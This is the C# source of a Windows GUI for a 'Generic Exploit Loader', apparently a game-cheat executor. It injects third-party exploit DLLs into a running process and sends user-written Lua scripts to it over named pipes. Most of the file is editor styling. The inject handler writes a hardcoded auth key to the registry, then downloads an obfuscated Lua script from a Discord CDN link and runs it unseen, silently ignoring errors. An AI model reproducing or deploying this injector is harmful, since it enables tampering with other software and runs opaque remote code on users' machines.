using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ScintillaNET;
using ExploitAPI;
using ApiModule;
using System.Threading;
using System.Net;
using System.IO;
using AxonSimpleUI;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace GRL_V2_GUI
{
    public partial class DefaultForm : Form
    {
        public int ExploitMode, ExeMode;
        public DefaultForm()
        {
            InitializeComponent();
            Console.WriteLine("Loaded core form function.");
            Console.WriteLine("Loading Monaco for first time...");
            MonacoLoad();
            Console.WriteLine("Loading ScintillaNET for first time...");
            ScintillaLoad();
            if (isConsoleVisible)
            {
                ShowHideConsole.ButtonText = "Hide Console";
                Console.WriteLine("User started the app with -EnableDebug!");
            }
            else
            {
                ShowHideConsole.ButtonText = "Show Console";
                Console.WriteLine("User started the app with no paramenter!");
            }
            Console.WriteLine("Applying patches...");
            Patches();
            Console.WriteLine("Done!");
            Console.WriteLine("GUI Loaded [DefaultForm.cs]");
            Console.WriteLine("No Consification API because It's skidded from WRD API and Nonsense Diamond :/");
        }
        public static bool isConsoleVisible;
        private const int BACK_COLOR = 0x2A211C;
        private const int FORE_COLOR = 0xB7B7B7;
        private const int NUMBER_MARGIN = 1;
        private const int FOLDING_MARGIN = 3;
        private const bool CODEFOLDING_CIRCULAR = true;
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void ScintillaLoad()
        {
            ScintillaInit();
            Console.WriteLine("Loaded ScintillaNET (1/3)");
            InitCodeFolding();
            Console.WriteLine("Loaded ScintillaNET (2/3)");
            InitNumberMargin();
            Console.WriteLine("Loaded ScintillaNET (3/3)");
        }
        private async void MonacoLoad()
        {
            new WebClient().Proxy = null;
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
                string friendlyName = AppDomain.CurrentDomain.FriendlyName;
                if (registryKey.GetValue(friendlyName) == null)
                {
                    registryKey.SetValue(friendlyName, 11001, RegistryValueKind.DWord);
                }
                this.MonacoEditor.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", Directory.GetCurrentDirectory()));
                await Task.Delay(500);

            }
            catch
            {
            }
            ExeMode = 2;
            MonacoEditor.Visible = true;
            TextArea.Visible = false;
        }
        private void Patches()
        {
            Console.WriteLine("[Patches]: Patching to make InjectPanel visible...");
            DraggableTitle.Controls.Remove(InjectPanel);
            TabMgrPanel.Controls.Remove(InjectPanel);
            ExecPanel.Controls.Remove(InjectPanel);
            Controls.Add(InjectPanel);
            InjectPanel.Visible = false;
            Console.WriteLine("[Patches]: Done!");
            Console.WriteLine("[Patches]: Patching to change text from AutisticWare credit to mine [Only real skidder will do this]...");
            Thread.Sleep(500);
            MonacoEditor.Document.InvokeScript("SetText", new object[] { "--Generic Exploit Loader--\n--Made by iceskiddo|teppyboy|TreTrauIT\n--Monaco Editor and code related to Monaco Editor by AutisticWare UI source." });
            Console.WriteLine("[Patches]: Done!");
            MonacoEditor.Document.BackColor = Color.FromArgb(30, 30, 30);
        }
        private void InitCodeFolding()
        {
            Console.WriteLine("[ScintillaNET]: Load InitCodeFolding()");
            TextArea.SetFoldMarginColor(true, IntToColor(BACK_COLOR));
            TextArea.SetFoldMarginHighlightColor(true, IntToColor(BACK_COLOR));

            // Enable code folding
            TextArea.SetProperty("fold", "1");
            TextArea.SetProperty("fold.compact", "1");

            // Configure a margin to display folding symbols
            TextArea.Margins[FOLDING_MARGIN].Type = MarginType.Symbol;
            TextArea.Margins[FOLDING_MARGIN].Mask = Marker.MaskFolders;
            TextArea.Margins[FOLDING_MARGIN].Sensitive = true;
            TextArea.Margins[FOLDING_MARGIN].Width = 20;

            // Set colors for all folding markers
            for (int i = 25; i <= 31; i++)
            {
                TextArea.Markers[i].SetForeColor(IntToColor(BACK_COLOR)); // styles for [+] and [-]
                TextArea.Markers[i].SetBackColor(IntToColor(FORE_COLOR)); // styles for [+] and [-]
            }

            // Configure folding markers with respective symbols
            TextArea.Markers[Marker.Folder].Symbol = CODEFOLDING_CIRCULAR ? MarkerSymbol.CirclePlus : MarkerSymbol.BoxPlus;
            TextArea.Markers[Marker.FolderOpen].Symbol = CODEFOLDING_CIRCULAR ? MarkerSymbol.CircleMinus : MarkerSymbol.BoxMinus;
            TextArea.Markers[Marker.FolderEnd].Symbol = CODEFOLDING_CIRCULAR ? MarkerSymbol.CirclePlusConnected : MarkerSymbol.BoxPlusConnected;
            TextArea.Markers[Marker.FolderMidTail].Symbol = MarkerSymbol.TCorner;
            TextArea.Markers[Marker.FolderOpenMid].Symbol = CODEFOLDING_CIRCULAR ? MarkerSymbol.CircleMinusConnected : MarkerSymbol.BoxMinusConnected;
            TextArea.Markers[Marker.FolderSub].Symbol = MarkerSymbol.VLine;
            TextArea.Markers[Marker.FolderTail].Symbol = MarkerSymbol.LCorner;

            // Enable automatic folding
            TextArea.AutomaticFold = (AutomaticFold.Show | AutomaticFold.Click | AutomaticFold.Change);

        }

        private void InitNumberMargin()
        {
            Console.WriteLine("[ScintillaNET]: Load InitNumberMargin()");
            TextArea.Styles[Style.LineNumber].BackColor = IntToColor(BACK_COLOR);
            TextArea.Styles[Style.LineNumber].ForeColor = IntToColor(FORE_COLOR);
            TextArea.Styles[Style.IndentGuide].ForeColor = IntToColor(FORE_COLOR);
            TextArea.Styles[Style.IndentGuide].BackColor = IntToColor(BACK_COLOR);

            var nums = TextArea.Margins[NUMBER_MARGIN];
            nums.Width = 30;
            nums.Type = MarginType.Number;
            nums.Sensitive = true;
            nums.Mask = 0;
        }
        private void ScintillaInit()
        {
            Console.WriteLine("[ScintillaNET]: Setting styles");
            TextArea.StyleResetDefault();
            TextArea.Styles[Style.Default].Font = "Consolas";
            TextArea.Styles[Style.Default].Size = 10;
            TextArea.Styles[Style.Default].BackColor = IntToColor(0x212121);
            TextArea.Styles[Style.Default].ForeColor = IntToColor(0xFFFFFF);
            TextArea.StyleClearAll();
            var alphaChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var numericChars = "0123456789";
            var accentedChars = "ŠšŒœŸÿÀàÁáÂâÃãÄäÅåÆæÇçÈèÉéÊêËëÌìÍíÎîÏïÐðÑñÒòÓóÔôÕõÖØøÙùÚúÛûÜüÝýÞþßö";
            TextArea.Styles[Style.Lua.Default].ForeColor = Color.Silver;
            TextArea.Styles[Style.Lua.Comment].ForeColor = IntToColor(0xBD758B);
            TextArea.Styles[Style.Lua.CommentLine].ForeColor = IntToColor(0x40BF57);
            TextArea.Styles[Style.Lua.Number].ForeColor = IntToColor(0xFFFF00);
            TextArea.Styles[Style.Lua.Word].ForeColor = IntToColor(0x48A8EE);
            TextArea.Styles[Style.Lua.Word2].ForeColor = IntToColor(0xF98906);
            TextArea.Styles[Style.Lua.Word3].ForeColor = Color.DarkSlateBlue;
            TextArea.Styles[Style.Lua.Word4].ForeColor = Color.DarkSlateBlue;
            TextArea.Styles[Style.Lua.String].ForeColor = IntToColor(0xFFFF00);
            TextArea.Styles[Style.Lua.Character].ForeColor = IntToColor(0xE95454);
            TextArea.Styles[Style.Lua.LiteralString].ForeColor = Color.Red;
            TextArea.Styles[Style.Lua.StringEol].BackColor = Color.Pink;
            TextArea.Styles[Style.Lua.Operator].ForeColor = Color.Purple;
            TextArea.Styles[Style.Lua.Preprocessor].ForeColor = Color.Maroon;
            TextArea.Lexer = Lexer.Lua;
            TextArea.WordChars = alphaChars + numericChars + accentedChars;

            Console.WriteLine("[ScintillaNET]: \n" + TextArea.DescribeKeywordSets());

            // Keywords
            TextArea.SetKeywords(0, "and break do else elseif end for function if in local nil not or repeat return then until while" + " false true" + " goto");
            // Basic Functions
            TextArea.SetKeywords(1, "assert collectgarbage dofile error _G getmetatable ipairs loadfile next pairs pcall print rawequal rawget rawset setmetatable tonumber tostring type _VERSION xpcall string table math coroutine io os debug" + " getfenv gcinfo load loadlib loadstring require select setfenv unpack _LOADED LUA_PATH _REQUIREDNAME package rawlen package bit32 utf8 _ENV");
            // String Manipulation & Mathematical
            TextArea.SetKeywords(2, "string.byte string.char string.dump string.find string.format string.gsub string.len string.lower string.rep string.sub string.upper table.concat table.insert table.remove table.sort math.abs math.acos math.asin math.atan math.atan2 math.ceil math.cos math.deg math.exp math.floor math.frexp math.ldexp math.log math.max math.min math.pi math.pow math.rad math.random math.randomseed math.sin math.sqrt math.tan" + " string.gfind string.gmatch string.match string.reverse string.pack string.packsize string.unpack table.foreach table.foreachi table.getn table.setn table.maxn table.pack table.unpack table.move math.cosh math.fmod math.huge math.log10 math.modf math.mod math.sinh math.tanh math.maxinteger math.mininteger math.tointeger math.type math.ult" + " bit32.arshift bit32.band bit32.bnot bit32.bor bit32.btest bit32.bxor bit32.extract bit32.replace bit32.lrotate bit32.lshift bit32.rrotate bit32.rshift" + " utf8.char utf8.charpattern utf8.codes utf8.codepoint utf8.len utf8.offset");
            // Input and Output Facilities and System Facilities
            TextArea.SetKeywords(3, "coroutine.create coroutine.resume coroutine.status coroutine.wrap coroutine.yield io.close io.flush io.input io.lines io.open io.output io.read io.tmpfile io.type io.write io.stdin io.stdout io.stderr os.clock os.date os.difftime os.execute os.exit os.getenv os.remove os.rename os.setlocale os.time os.tmpname" + " coroutine.isyieldable coroutine.running io.popen module package.loaders package.seeall package.config package.searchers package.searchpath" + " require package.cpath package.loaded package.loadlib package.path package.preload");
            // Instruct the lexer to calculate folding
            TextArea.SetProperty("fold", "1");
            TextArea.SetProperty("fold.compact", "1");

            // Configure a margin to display folding symbols
            TextArea.Margins[2].Type = MarginType.Symbol;
            TextArea.Margins[2].Mask = Marker.MaskFolders;
            TextArea.Margins[2].Sensitive = true;
            TextArea.Margins[2].Width = 20;

            // Set colors for all folding markers
            for (int i = 25; i <= 31; i++)
            {
                TextArea.Markers[i].SetForeColor(SystemColors.ControlLightLight);
                TextArea.Markers[i].SetBackColor(SystemColors.ControlDark);
            }

            // Configure folding markers with respective symbols
            TextArea.Markers[Marker.Folder].Symbol = MarkerSymbol.BoxPlus;
            TextArea.Markers[Marker.FolderOpen].Symbol = MarkerSymbol.BoxMinus;
            TextArea.Markers[Marker.FolderEnd].Symbol = MarkerSymbol.BoxPlusConnected;
            TextArea.Markers[Marker.FolderMidTail].Symbol = MarkerSymbol.TCorner;
            TextArea.Markers[Marker.FolderOpenMid].Symbol = MarkerSymbol.BoxMinusConnected;
            TextArea.Markers[Marker.FolderSub].Symbol = MarkerSymbol.VLine;
            TextArea.Markers[Marker.FolderTail].Symbol = MarkerSymbol.LCorner;

            // Enable automatic folding
            TextArea.AutomaticFold = (AutomaticFold.Show | AutomaticFold.Click | AutomaticFold.Change);
        }
        public static Color IntToColor(int rgb)
        {
            return Color.FromArgb(255, (byte)(rgb >> 16), (byte)(rgb >> 8), (byte)rgb);
        }

        private void DefaultForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        bool IsExecPanel = true;
        private void IconBtn_Click(object sender, EventArgs e)
        {
            if (TabMgrPanel.Width == 200)
            {
                if (ExecPanel.Visible)
                {
                    IsExecPanel = true;
                    SuperSlideee.HideSync(ExecPanel);
                }
                else
                {
                    IsExecPanel = false;
                    SuperSlideee.HideSync(InjectPanel);
                }
                SuperSlideee.HideSync(TabMgrPanel);
                TabMgrPanel.Width = 55;
                ExecPanel.Location = new Point(55, 35);
                ExecPanel.Width = 761;
                InjectPanel.Location = new Point(55, 35);
                InjectPanel.Width = 761;
                Title.Visible = false;
                SuperSlideee.ShowSync(TabMgrPanel);
                if (IsExecPanel)
                    SuperSlideee.ShowSync(ExecPanel);
                else
                    SuperSlideee.ShowSync(InjectPanel);
            }
            else
            {
                if (ExecPanel.Visible)
                {
                    IsExecPanel = true;
                    SuperSlideee.HideSync(ExecPanel);
                }
                else
                {
                    IsExecPanel = false;
                    SuperSlideee.HideSync(InjectPanel);
                }
                SuperSlideee.HideSync(TabMgrPanel);
                TabMgrPanel.Width = 200;
                ExecPanel.Location = new Point(203, 35);
                ExecPanel.Width = 613;
                InjectPanel.Location = new Point(203, 35);
                InjectPanel.Width = 613;
                Title.Visible = true;
                SuperSlideee.ShowSync(TabMgrPanel);
                if (IsExecPanel)
                    SuperSlideee.ShowSync(ExecPanel);
                else
                    SuperSlideee.ShowSync(InjectPanel);
            }
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void ClrBtn_Click(object sender, EventArgs e)
        {
            if (ExeMode == 1)
                TextArea.ClearAll();
            else
                MonacoEditor.Document.InvokeScript("SetText", new object[] { "" });
        }

        private void ShowHideConsole_Click(object sender, EventArgs e)
        {
            if (isConsoleVisible)
            {
                var handle = Program.GetConsoleWindow();
                Program.ShowWindow(handle, Program.SW_HIDE);
                isConsoleVisible = false;
                ShowHideConsole.ButtonText = "Show Console";
            }
            else
            {
                var handle = Program.GetConsoleWindow();
                Program.ShowWindow(handle, Program.SW_SHOW);
                isConsoleVisible = true;
                ShowHideConsole.ButtonText = "Hide Console";
            }
        }

        private void WRDAPICheck_Click(object sender, EventArgs e)
        {
            ExploitMode = 1;
            APIMCheck.Value = false;
            SkidsploitOnOff.Value = false;
            HaxonSwitch.Value = false;
        }

        private void APIMCheck_Click(object sender, EventArgs e)
        {
            ExploitMode = 2;
            WRDAPICheck.Value = false;
            SkidsploitOnOff.Value = false;
            HaxonSwitch.Value = false;
        }

        private void InjectBtn_Click(object sender, EventArgs e)
        {
            if (WRDAPICheck.Value == true)
            {
                ExploitAPI.ExploitAPI.LaunchExploit();
                Console.WriteLine("Injected WeAreDevs API.");
                MessageBox.Show("Injected WeAreDevs API.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (APIMCheck.Value == true)
            {
                ApiModule.ApiModule.LaunchExploit();
                Console.WriteLine("Injected ApiModule.");
                MessageBox.Show("Injected ApiModule.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (SkidsploitOnOff.Value == true)
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\SkisploitAuth", true);
                bool flag3 = registryKey == null;
                if (flag3)
                {
                    registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\\\SkisploitAuth");
                    registryKey.SetValue("Auth", "");
                }
                registryKey.SetValue("Auth", "382fe18b3029c5d86349cd91d0b57410158afac49ba9d3935687d84edd0f97b7");
                RedBoy.Functions.Inject();
                Thread.Sleep(3000);
                try
                {
                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/591382108279406592/591382413662486533/redboyscripts-obfuscated.lua", "script.txt");
                    string script = File.ReadAllText("script.txt");
                    File.Delete("script.txt");
                    RedBoy.NamedPipes.LuaPipe(script);
                }
                catch
                {
                }
                Console.WriteLine("Injected RedBoy.");
                MessageBox.Show("Injected Skisploit API.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (HaxonSwitch.Value == true)
            {
                Functions.Inject();
                Console.WriteLine("Injected Haxon-[Generic].");
                MessageBox.Show("Injected Haxon.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                Console.WriteLine("Couldn't Inject. Ex: User hasnt choosed mode to inject.");
                MessageBox.Show("Please choose a mode to inject.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        private void BunifuExecLua_Click(object sender, EventArgs e)
        {
            switch (ExeMode)
            {
                case 1:
                    if (WRDAPICheck.Value == true)
                    {
                        ExploitAPI.ExploitAPI.SendLuaScript(TextArea.Text);
                        Console.WriteLine("Executed script using WeAreDevs API");
                    }
                    else if (APIMCheck.Value == true)
                    {
                        ApiModule.ApiModule.ExecuteScript(TextArea.Text);
                        Console.WriteLine("Executed script using ApiModule");
                    }
                    else if (SkidsploitOnOff.Value == true)
                    {
                        RedBoy.NamedPipes.LuaPipe(TextArea.Text);
                        Console.WriteLine("Executed script using RedBoy");
                    }
                    else if (HaxonSwitch.Value == true)
                    {
                        NamedPipes.LuaPipe(TextArea.Text);
                        Console.WriteLine("Executed script using Haxon-[Generic]");
                    }
                    else
                    {
                        Console.WriteLine("Can't execute script, user hasn't choosed mode yet.");
                        MessageBox.Show("Please choose a mode to execute.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    break;
                case 2:
                    HtmlDocument document = this.MonacoEditor.Document;
                    string scriptName = "GetText";
                    object[] array = new string[0];
                    object[] args = array;
                    if (WRDAPICheck.Value == true)
                    {
                        ExploitAPI.ExploitAPI.SendLuaScript(document.InvokeScript(scriptName, args).ToString());
                        Console.WriteLine("Executed script using WeAreDevs API");
                    }
                    else if (APIMCheck.Value == true)
                    {
                        ApiModule.ApiModule.ExecuteScript(document.InvokeScript(scriptName, args).ToString());
                        Console.WriteLine("Executed script using ApiModule");
                    }
                    else if (SkidsploitOnOff.Value == true)
                    {
                        RedBoy.NamedPipes.LuaPipe(document.InvokeScript(scriptName, args).ToString());
                        Console.WriteLine("Executed script using RedBoy");
                    }
                    else if (HaxonSwitch.Value == true)
                    {
                        NamedPipes.LuaPipe(document.InvokeScript(scriptName, args).ToString());
                        Console.WriteLine("Executed script using Haxon-[Generic]");
                    }
                    else
                    {
                        Console.WriteLine("Can't execute script, user hasn't choosed mode yet.");
                        MessageBox.Show("Please choose a mode to execute.", "Generic Exploit Loader", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    break;
            }
        }

        private void ExecutorTab_Click(object sender, EventArgs e)
        {
            ExecPanel.BringToFront();
            if (!ExecPanel.Visible)
            {
                SuperSlideee.HideSync(InjectPanel);
                InjectPanel.Visible = false;
                SuperSlideee.ShowSync(ExecPanel);
                ExecPanel.Visible = true;
            }
        }

        private void InjectTab_Click(object sender, EventArgs e)
        {
            InjectPanel.BringToFront();
            if (!InjectPanel.Visible)
            {
                SuperSlideee.HideSync(ExecPanel);
                ExecPanel.Visible = false;
                SuperSlideee.ShowSync(InjectPanel);
                InjectPanel.Visible = true;
            }
        }

        private void SkidsploitOnOff_Click(object sender, EventArgs e)
        {
            ExploitMode = 3;
            WRDAPICheck.Value = false;
            APIMCheck.Value = false;
            HaxonSwitch.Value = false;
        }
        private void HaxonSwitch_Click(object sender, EventArgs e)
        {
            ExploitMode = 4;
            WRDAPICheck.Value = false;
            APIMCheck.Value = false;
            SkidsploitOnOff.Value = false;
            Functions.exploitdllname = "HaxonByteCode.dll";
            NamedPipes.luapipename = "HaxonByte";
        }

        private void ExeModeSwitch_Click(object sender, EventArgs e)
        {
            if (ExeMode == 1)
            {
                SuperSlideee.HideSync(ExeModeSwitch);
                SuperSlideee.HideSync(TextArea);
                SuperSlideee.ShowSync(MonacoEditor);
                ExeMode = 2;
                ExeModeSwitch.ButtonText = "Executor Mode: Monaco";
                SuperSlideee.ShowSync(ExeModeSwitch);
            }
            else
            {
                SuperSlideee.HideSync(ExeModeSwitch);
                SuperSlideee.HideSync(MonacoEditor);
                SuperSlideee.ShowSync(TextArea);
                ExeMode = 1;
                ExeModeSwitch.ButtonText = "Executor Mode: ScintillaNET";
                SuperSlideee.ShowSync(ExeModeSwitch);
            }
        }

        private void DraggableTitle_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
    }
}
